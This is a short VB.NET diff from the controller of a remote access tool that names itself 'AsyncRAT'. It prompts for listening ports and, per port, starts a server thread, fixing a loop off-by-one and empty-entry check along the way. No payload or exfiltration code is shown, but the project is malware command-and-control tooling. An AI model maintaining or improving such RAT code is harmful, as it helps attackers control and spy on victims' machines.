@@ -28,13 +28,13 @@ Public Class Form1
 
 
         Try
-            Dim URL As String = InputBox("Enter Ports", "AsyncRAT", "8989,5656,2323")
-            If String.IsNullOrEmpty(URL) Then
+            Dim PORTS As String = InputBox("Enter Ports", "AsyncRAT", "8989,5656,2323")
+            If String.IsNullOrEmpty(PORTS) Then
                 Environment.Exit(0)
             Else
-                Dim A As String() = Split(URL, ",")
-                For i As Integer = 0 To A.Length
-                    If A(i) <> Nothing Then
+                Dim A As String() = Split(PORTS, ",")
+                For i As Integer = 0 To A.Length - 1
+                    If Not String.IsNullOrWhiteSpace(A(i)) Then
                         Settings.Ports.Add(A(i))
                         S = New Server
                         Dim listener As New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf S.Start))
